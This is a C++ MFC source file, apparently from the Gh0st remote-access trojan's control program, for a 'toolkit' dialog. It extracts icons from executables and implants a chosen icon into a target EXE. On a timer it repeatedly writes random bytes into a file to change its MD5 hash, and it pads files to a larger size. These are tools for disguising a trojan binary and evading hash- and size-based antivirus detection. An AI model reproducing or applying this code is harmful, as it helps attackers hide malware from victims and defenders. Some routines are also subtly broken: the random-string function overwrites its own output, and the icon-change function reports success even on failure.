// MyToolsKit.cpp : implementation file
//

#include "stdafx.h"
#include "Gh0st.h"
#include "MyToolsKit.h"
#include <Winbase.h>
#include <assert.h> 

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyToolsKit dialog
CIcons *pIcons = NULL;

CMyToolsKit::CMyToolsKit(CWnd* pParent /*=NULL*/)
	: CDialog(CMyToolsKit::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyToolsKit)
	m_Path = _T("");
	m_time = 1;
	//}}AFX_DATA_INIT
}


void CMyToolsKit::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyToolsKit)
	DDX_Control(pDX, IDC_SLIDER1, m_Sllider);
	DDX_Control(pDX, IDC_LIST2, m_List);
	DDX_Text(pDX, IDC_EDIT_PATH, m_Path);
	DDX_Text(pDX, IDC_EDIT_TIME1, m_time);
	DDV_MinMaxUInt(pDX, m_time, 1, 100000);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMyToolsKit, CDialog)
	//{{AFX_MSG_MAP(CMyToolsKit)
	ON_BN_CLICKED(IDC_SELECTICON, OnSelecticon)
	ON_LBN_SELCHANGE(IDC_LIST2, OnSelchangeList2)
	ON_WM_PAINT()
	ON_BN_CLICKED(IDC_BUTTON_SAVEAS, OnButtonSaveas)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	ON_BN_CLICKED(IDC_SELECTFILE, OnSelectfile)
	ON_BN_CLICKED(IDC_START, OnStart)
	ON_BN_CLICKED(IDC_STOP, OnStop)
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON4, OnButton4)
	ON_BN_CLICKED(IDC_CHECK3, OnCheck3)
	ON_BN_CLICKED(IDC_FILE_PATH, OnFilePath)
	ON_NOTIFY(NM_RELEASEDCAPTURE, IDC_SLIDER1, OnCustomdrawSlider1)
	ON_BN_CLICKED(IDC_BUTTON5, OnButton5)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyToolsKit message handlers

BOOL CMyToolsKit::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
// 	SetIcon(AfxGetApp()->LoadIcon(IDI_TOOL),FALSE);
// 	SetIcon(AfxGetApp()->LoadIcon(IDI_TOOL),TRUE);

	//初始化图标资源变量
    lpIR = (LPICONRESOURCE )malloc(sizeof(ICONRESOURCE));
	lstrcpy( lpIR->szOriginalICOFileName, "Untitled" );
	lstrcpy( lpIR->szOriginalDLLFileName, "" );
	lpIR->nNumImages = 0;

	GetDlgItem(IDC_BUTTON_SAVEAS)->EnableWindow(FALSE);
	((CButton *)GetDlgItem(IDC_START))->EnableWindow(TRUE);
	((CButton *)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);


	GetDlgItem(IDC_SLIDER1)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT5)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON5)->EnableWindow(FALSE);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


BOOL CALLBACK MyEnumProcedure( HANDLE  hModule, LPCTSTR  lpszType, LPTSTR  lpszName, LONG  lParam )	
{
    TCHAR	szBuffer[256];
    LONG    nIndex = LB_ERR;
    LPTSTR	lpID = NULL;
	
    // Name is from MAKEINTRESOURCE()
    if( HIWORD(lpszName) == 0 )
    {
        wsprintf( szBuffer, "图标 [%d]", (DWORD)lpszName );
        lpID = lpszName;
    }
    else
    {
        // Name is string
        //lpID = strdup( lpszName );
        
		wsprintf( szBuffer, "图标 [%s]", lpszName);
    }
    // Add it to the listbox
    nIndex = SendDlgItemMessage( (HWND)lParam, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)(szBuffer) );
    // Set the item data to be the name of the resource so we can get it later
    SendDlgItemMessage( (HWND)lParam, IDC_LIST2, LB_SETITEMDATA, (WPARAM)nIndex, (LPARAM)lpID );
	
    return TRUE;
}


void CMyToolsKit::OnSelecticon() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("PE FILE (*.exe)\0*.exe\0*.dll\0*.ico\0*.bmp\0*.tcl\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("请选择PE文件");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		
		szOpenFileName = szFile;
		
		char *Poiner = szFile;
		
		WORD i = strlen(szFile);
		
		Poiner+=i-3;
		
		szOpenFileExtName.Format("%s",Poiner);
		
		Poiner=NULL;
		
		szOpenFileExtName.MakeLower ();
		
		m_List.ResetContent (); //选清空左侧图标列表框
		
		if(szOpenFileExtName == "exe")//读取并显示EXE、DLL等资源文件
		{
			HINSTANCE  hLibrary;
			
			// Load the DLL/EXE - NOTE: must be a 32bit EXE/DLL for this to work
			if( (hLibrary = LoadLibraryEx( szOpenFileName, NULL, LOAD_LIBRARY_AS_DATAFILE )) == NULL )
			{
				// Failed to load - abort
				MessageBox( szOpenFileName+ "文件载入错误，必须是WIN32的文件!", "错误", MB_OK );
				return;
			}
			// Store the info
			EDII.szFileName =szOpenFileName;
			EDII.hInstance = hLibrary;
			
			// Fill in the listbox with the icons available
			if( ! EnumResourceNames( EDII.hInstance, RT_GROUP_ICON, (ENUMRESNAMEPROC )MyEnumProcedure, (LPARAM)GetSafeHwnd()) )
			{
				MessageBox( "列举图标资源名时出错!", "错误", MB_OK );
				return;
			}
			
		}
		
		m_List.SetCurSel (0);
		if( m_List.GetCount()  == 0 )
		{
			MessageBox( "此文件中没有图标资源!", "错误", MB_OK );
			//无图标资源，置保存和复制按钮为无效状态
			GetDlgItem(IDC_BUTTON_SAVEAS)->EnableWindow(FALSE);
			return;
		}
        //有图标资源，置保存和复制按钮为有效状态
		GetDlgItem(IDC_BUTTON_SAVEAS)->EnableWindow(TRUE);
		
		//刷新调用OnPaint来显示图标
		InvalidateRect(NULL,TRUE);
		
	}
}

void CMyToolsKit::OnSelchangeList2() 
{
	// TODO: Add your control notification handler code here
	InvalidateRect(NULL,TRUE);
}

void CMyToolsKit::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	LPTSTR lpIconID;
	HICON hIcon;
	if((lpIconID=(LPTSTR)m_List.GetItemData(m_List.GetCurSel()))!=(LPTSTR)LB_ERR )
	{
		if(szOpenFileExtName=="exe"||szOpenFileExtName=="dll"||szOpenFileExtName=="icl")
		{
			hIcon=pIcons->GetIconFromInstance(EDII.hInstance,lpIconID);
			CStatic* pStatic = (CStatic*) GetDlgItem(IDC_ICONSS);
			pStatic->SetIcon (hIcon);
		}
	}
	// Do not call CDialog::OnPaint() for painting messages
}


void CMyToolsKit::OnButtonSaveas() 
{
	// TODO: Add your control notification handler code here
	LPTSTR lpIconID;
	
	CFileDialog fileDialog( FALSE,"*.ICO",NULL,NULL,"图标文件(*.ICO)|*.ICO|位图文件(*.BMP)|*.BMP||");
	if (fileDialog.DoModal() == IDOK) 
	{
		szSaveFileName=fileDialog.GetPathName();	
        szSaveFileExtName= fileDialog.GetFileExt ();
		szSaveFileExtName.MakeLower ();
		
		if(szOpenFileExtName=="exe"||szOpenFileExtName=="dll"||szOpenFileExtName=="icl")
		{
			if((lpIconID=(LPTSTR)m_List.GetItemData (m_List.GetCurSel()))!= (LPTSTR)LB_ERR)
			{
				lpIR=pIcons->ReadIconFromEXEFile (szOpenFileName,lpIconID);
			}
		}
        if(szSaveFileExtName=="bmp")
		{
			if(lpIR!=NULL && m_List.GetCount ()>0)
			{
				BeginWaitCursor();
				pIcons->IconImageToBMPFile (szSaveFileName,&lpIR->IconImages [0]);
				EndWaitCursor();
			}
			else
				MessageBox( "没有可保存的图标资源!", "错误", MB_OK );
		}
		else if(szSaveFileExtName=="ico")
		{
			if(lpIR!=NULL && m_List.GetCount ()>0)
			{
				BeginWaitCursor();
				pIcons->WriteIconToICOFile (lpIR,szSaveFileName);
				EndWaitCursor();
			}
			else
				MessageBox( "没有可保存的图标资源!", "错误", MB_OK );
		}
	}
}

void CMyToolsKit::OnButton3() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("PE FILE (*.exe)\0*.exe\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("请选择EXE文件");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT2,szFile);	
	}
}

void CMyToolsKit::OnButton1() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("ico FILE (*.ico)\0*.ico\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("请选择图标文件");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT1,szFile);	
	}
}


#ifndef SAFE_RELEASE
#define SAFE_RELEASE(x) \
	if(x != NULL)        \
{                    \
	x->Release();     \
	x = NULL;         \
}
#endif

#ifndef SAFE_ARRAY_DELETE
#define SAFE_ARRAY_DELETE(x) \
	if(x != NULL)             \
{                         \
	delete[] x;            \
	x = NULL;              \
}
#endif

typedef struct tagHEADER      
{      
    WORD idReserved;      
    WORD idType;      
    WORD idCount;      
}HEADER, *LPHEADER;      

#pragma pack(push)      
#pragma pack(2)      
typedef struct tagGRPICONDIRENTRY      
{      
    BYTE bWidth;      
    BYTE bHeight;      
    BYTE bColorCount;      
    BYTE bReserved;      
    WORD wPlanes;      
    WORD wBitCount;      
    DWORD dwBytesInRes;      
    WORD nID;      
}GRPICONDIRENTRY, *LPGRPICONDIRENTRY;;      

typedef struct tagGRPICONDIR      
{      
    WORD idReserved;      
    WORD idType;      
    WORD idCount;      
    GRPICONDIRENTRY idEntries[1];      
}GRPICONDIR, *LPGRPICONDIR;      
#pragma pack(pop)     



BOOL ChangeExeIcons(LPCTSTR lpExeName,PBYTE pIconFileData,DWORD dwDataSize) 
{      
    LPICONDIRENTRY pIconDirEntry(NULL);
    LPGRPICONDIR pGrpIconDir(NULL);
    LPHEADER pHeader;
    LPBYTE pIconBytes(NULL);
    DWORD nGSize(0);
    HANDLE hUpdate(NULL);
    BOOL bReturn(FALSE);
    do
	{
		BOOL bRet;
		
		if(dwDataSize < sizeof(HEADER))break;
		pHeader = LPHEADER(pIconFileData);
		
		//建立每一个图标的目录信息存放区域
		if(dwDataSize < 
			(sizeof(HEADER) + sizeof(ICONDIRENTRY) * pHeader->idCount))break;
		pIconDirEntry = LPICONDIRENTRY(pIconFileData + sizeof(HEADER));
		
		//建立EXE文件中RT_GROUP_ICON所需的数据结构存放区域
		nGSize = sizeof(GRPICONDIR) + sizeof(GRPICONDIRENTRY) * (pHeader->idCount - 1);
		pGrpIconDir = LPGRPICONDIR(new BYTE[nGSize]);
		ZeroMemory(pGrpIconDir,nGSize);
		
		//填充信息，这里相当于一个转换的过程
		pGrpIconDir->idReserved = pHeader->idReserved;
		pGrpIconDir->idType = pHeader->idType;
		pGrpIconDir->idCount = pHeader->idCount;
		//复制信息并设置每一个图标对应的ID。ID为位置索引号
		for(int i = 0;i < pHeader->idCount;i++)      
		{
			pGrpIconDir->idEntries[i].bWidth = pIconDirEntry[i].bWidth;
			pGrpIconDir->idEntries[i].bHeight = pIconDirEntry[i].bHeight;
			pGrpIconDir->idEntries[i].bColorCount = pIconDirEntry[i].bColorCount;
			pGrpIconDir->idEntries[i].bReserved = pIconDirEntry[i].bReserved;
			pGrpIconDir->idEntries[i].wPlanes = pIconDirEntry[i].wPlanes;
			pGrpIconDir->idEntries[i].wBitCount = pIconDirEntry[i].wBitCount;
			pGrpIconDir->idEntries[i].dwBytesInRes = pIconDirEntry[i].dwBytesInRes;
			pGrpIconDir->idEntries[i].nID = i+1;    //ID可以随机选,但最好不要和之前存在的有冲突,可以使用 FindResource(...,MAKEINTRESOURCE(n),RT_ICON);测试
		}
		
		hUpdate = BeginUpdateResource(lpExeName, false);
		if (hUpdate)      
		{
			//首先更新RT_GROUP_ICON信息
			bRet = UpdateResource(
				hUpdate,
				RT_GROUP_ICON,
				MAKEINTRESOURCE(1),//EXE显示为最小ID的图标组
				MAKELANGID(LANG_CHINESE,SUBLANG_CHINESE_SIMPLIFIED),
				pGrpIconDir,
				nGSize);
			if (!bRet)break;
			
			//接着的是每一个Icon的信息存放
			for(int i = 0;i < pHeader->idCount;i++)
			{
				if(dwDataSize <
					(pIconDirEntry[i].dwImageOffset +
					pIconDirEntry[i].dwBytesInRes))break;
				pIconBytes = pIconFileData + pIconDirEntry[i].dwImageOffset;
				//准备pIconBytes来存放文件里的Byte信息用于更新到EXE中。
				
				//更新每一个ID对应的RT_ICON信息      
				bRet = UpdateResource(
					hUpdate,
					RT_ICON,
					MAKEINTRESOURCE(pGrpIconDir->idEntries[i].nID),
					MAKELANGID(LANG_CHINESE,SUBLANG_CHINESE_SIMPLIFIED),
					pIconBytes,
					pIconDirEntry[i].dwBytesInRes);
				if(!bRet)break;
			}
			//结束EXE资源的更新操作
			EndUpdateResource(hUpdate, false);
			bReturn = TRUE;
		}
	}while(false);
    
    //清理资源并关闭Icon文件，到此更新操作结束！
    SAFE_ARRAY_DELETE(pGrpIconDir);
	return bReturn;
}

BOOL CMyToolsKit::ChangeExeIcon(LPSTR lpIconFile, LPSTR lpExeName)
{
	HANDLE hIconFile = INVALID_HANDLE_VALUE;
	PBYTE pIconFileData = NULL;
	BOOL bSuceeded = FALSE;
	do
	{
		hIconFile= CreateFile(
			lpIconFile,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if(hIconFile == INVALID_HANDLE_VALUE)break;
		
		DWORD dwIconFileSize = GetFileSize(hIconFile,NULL);
		pIconFileData = new BYTE[dwIconFileSize];
		if(!pIconFileData)break;
		
		DWORD dwReaded;
		if(!ReadFile(
			hIconFile,
			pIconFileData,
			dwIconFileSize,
			&dwReaded,
			NULL))break;
		if(dwReaded != dwIconFileSize)break;
		
		if(!ChangeExeIcons(
			lpExeName,
			pIconFileData,
			dwIconFileSize))break;
		
		bSuceeded = TRUE;
		
	}while(false);
	
	if(pIconFileData)
		delete pIconFileData;
	if(hIconFile != INVALID_HANDLE_VALUE)
		CloseHandle(hIconFile);
	return TRUE;
}

void CMyToolsKit::OnButton2() 
{
	// TODO: Add your control notification handler code here
	char ExePath[MAX_PATH]={NULL};
	
	char IconPath[MAX_PATH]={NULL};
	
	GetDlgItemText(IDC_EDIT2,ExePath,MAX_PATH);
	GetDlgItemText(IDC_EDIT1,IconPath,MAX_PATH);
	
	if(ChangeExeIcon(IconPath,ExePath))
	{
		MessageBox("恭喜 文件修改成功!!!");
	}
	else
	{
		MessageBox("文件修改失败!!!");
	}

}
void MD5_File (char * filename,char *MD5);
void CMyToolsKit::OnSelectfile() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("All File (*.*)\0*.*\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("请选择文件");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		TCHAR szPathA[MAX_PATH] = {0};
		TCHAR szPathB[MAX_PATH] = {0};	
		
		char Md5[64]={NULL};
		
		MD5_File(szFile,Md5);
		SetDlgItemText(IDC_OMD3,Md5);
		
		m_Path=szFile;
		UpdateData(FALSE);
	}
}



void CMyToolsKit::OnStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if(m_Path.GetLength()<1) 
	{
		MessageBox("您还没有选择文件!!","友情提示",MB_ICONWARNING|MB_OK);
		return ;	
	}

	SetTimer(0x100,m_time*1000,NULL);
	((CButton *)GetDlgItem(IDC_START))->EnableWindow(FALSE);
	((CButton *)GetDlgItem(IDC_STOP))->EnableWindow(TRUE);
}

void CMyToolsKit::OnStop() 
{
	// TODO: Add your control notification handler code here
	// TODO: Add your control notification handler code here
	KillTimer(0x100);
	((CButton *)GetDlgItem(IDC_START))->EnableWindow(TRUE);
	((CButton *)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);
}
DWORD CountTimes=0;
void CMyToolsKit::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent==0x100)
	{
		HANDLE m_Handle = CreateFile(m_Path.GetBuffer(0),GENERIC_WRITE,
			FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,
			NULL);
		if(m_Handle==INVALID_HANDLE_VALUE)
		{
			CDialog::OnTimer(nIDEvent);
			return;
		}
		char VarMd5[64]={NULL};
		ZeroMemory(VarMd5,64);
		GetDlgItemText(IDC_CMD5,VarMd5,64);

		if(strlen(VarMd5)<10)
			SetFilePointer(m_Handle,0,0,FILE_END);
		else
			SetFilePointer(m_Handle,-100,NULL,FILE_END);

		CHAR Buffer[100]={NULL};
//		((CGh0stApp *)AfxGetApp())->GetRandString(Buffer,100);   //随机数据

		GetRandString(Buffer,100);   //随机数据
//		Buffer[0]=CountTimes*12;

		DWORD WriteBytes=0;
		WriteFile(m_Handle,Buffer,100,&WriteBytes,NULL);   //写入数据
		
		CloseHandle(m_Handle);

		char CMd5[64]={NULL};
		MD5_File(m_Path.GetBuffer(0),CMd5);    //计算MD5
		SetDlgItemText(IDC_CMD5,CMd5);

		CountTimes++;

		CString szStr;
		szStr.Format("当前已修改次数 %d ",CountTimes);
		SetDlgItemText(IDC_STATIC_COUNT,szStr);

	}
	CDialog::OnTimer(nIDEvent);
}

void CMyToolsKit::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CDialog::OnClose();
}

void CMyToolsKit::OnButton4() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("ICON (*.ico)\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("请选择图标文件");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT1,szFile);	
	}
}

void CMyToolsKit::OnCheck3() 
{
	// TODO: Add your control notification handler code here
	
}

void CMyToolsKit::OnFilePath() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("All FILE (*.*)\0*.*\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("请选择图标文件");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT4,szFile);

		HANDLE Handle = CreateFile(szFile,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if(Handle == INVALID_HANDLE_VALUE)
		{
			MessageBox("文件拒绝访问..请尝试复制一份 再修改!");
			return;
		}
		DWORD Size = GetFileSize(Handle,NULL)/1024;

		m_Sllider.SetRange(Size,10240);
		m_Sllider.SetPos(Size);

		CloseHandle(Handle);

		GetDlgItem(IDC_SLIDER1)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT5)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON5)->EnableWindow(TRUE);
	}
}

void CMyToolsKit::OnCustomdrawSlider1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	SetDlgItemInt(IDC_EDIT5,m_Sllider.GetPos());

	*pResult = 0;
}

void CMyToolsKit::OnButton5() 
{
	// TODO: Add your control notification handler code here
	CHAR Path[MAX_PATH]={NULL};
	ZeroMemory(Path,MAX_PATH);

	GetDlgItemText(IDC_EDIT4,Path,MAX_PATH);
	
	HANDLE Handle = CreateFile(Path,GENERIC_WRITE,FILE_SHARE_WRITE,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(Handle == INVALID_HANDLE_VALUE)
	{
		MessageBox("文件拒绝访问..请尝试复制一份 再修改!");
		return;
	}
	
	DWORD MotifySize=m_Sllider.GetPos();

	DWORD FileSize = GetFileSize(Handle,NULL)/1024;

	MotifySize = MotifySize - FileSize;
	
	CHAR Buffer[1024]={NULL};
	GetRandString(Buffer,1024);
	
	SetFilePointer(Handle,0,0,FILE_END);

	DWORD WriteBytes=0;
	for (DWORD i=0;i<MotifySize;i++)
		WriteFile(Handle,Buffer,1024,&WriteBytes,NULL);
	
	CloseHandle(Handle);

	MessageBox("修改成功!");

}

//随机字符串产生函数，支持链式结构    
void CMyToolsKit::GetRandString(LPSTR szStr,DWORD len)  
{  
	assert(szStr != NULL);  
	char* pvCode = szStr;  
	char  singleCode[2];  
	char  verificationValue[64] = "00123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
	memset(szStr,0 ,len);  
	memset(singleCode,0,2);   
	srand((unsigned int)time((time_t *)NULL));  
	for(unsigned int i=1; i <= len; ++i)  
	{  
		sprintf(singleCode,"%c",verificationValue[(rand()%62)+1]);  
		strcpy(szStr,singleCode);     
	}  
	
} 
